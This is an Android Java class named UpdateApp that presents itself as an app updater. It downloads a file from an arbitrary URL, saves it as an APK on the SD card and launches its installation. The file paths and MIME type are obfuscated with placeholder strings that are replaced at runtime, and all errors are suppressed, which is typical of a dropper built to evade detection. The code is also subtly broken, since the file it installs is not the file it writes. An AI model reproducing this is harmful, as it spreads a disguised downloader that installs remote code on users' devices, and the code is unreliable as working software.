package store.apps;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;


import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UpdateApp extends AsyncTask<String,Void,Void> {
    private Context context;
    public void setContext(Context contextf, final String... arg0){
        context = contextf;
        try {
            URL url = new URL(arg0[0]);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("GET");
            c.setDoOutput(true);
            c.connect();

            String PATH =Rep("[RANDOM-STRING]mnt[RANDOM-STRING]sdcard[RANDOM-STRING]Download[RANDOM-STRING]","[RANDOM-STRING]","/");
            File file = new File(PATH);
            file.mkdirs();
            File outputFile = new File(file, Rep( "[RANDOM-STRING]update[RANDOM-STRING]apk","[RANDOM-STRING]","."));
            if(outputFile.exists()){
                outputFile.delete();
            }
            FileOutputStream fos = new FileOutputStream(outputFile);

            InputStream is = c.getInputStream();

            byte[] buffer = new byte[1024];
            int len1 = 0;
            while ((len1 = is.read(buffer)) != -1) {
                fos.write(buffer, 0, len1);
            }
            fos.close();
            is.close();

            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(Rep( "[RANDOM-STRING]mnt[RANDOM-STRING]sdcard[RANDOM-STRING]Download[RANDOM-STRING].update.apk","[RANDOM-STRING]","/"))),
                    Rep( "application/vnd[RANDOM-STRING]android[RANDOM-STRING]package-archive","[RANDOM-STRING]","."));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
            context.startActivity(intent);


        } catch (Exception e) {
            // Log.e("UpdateAPP", "Update error! " + e.getMessage());
        }

    }

    private String Rep(String Text,String Target,String original)
    {

     try
     {
      return  Text.replace(Target,original);
     }catch (Exception e){}
     return "";
    }

    @Override
    protected Void doInBackground(String... arg0) {

        return null;
    }
}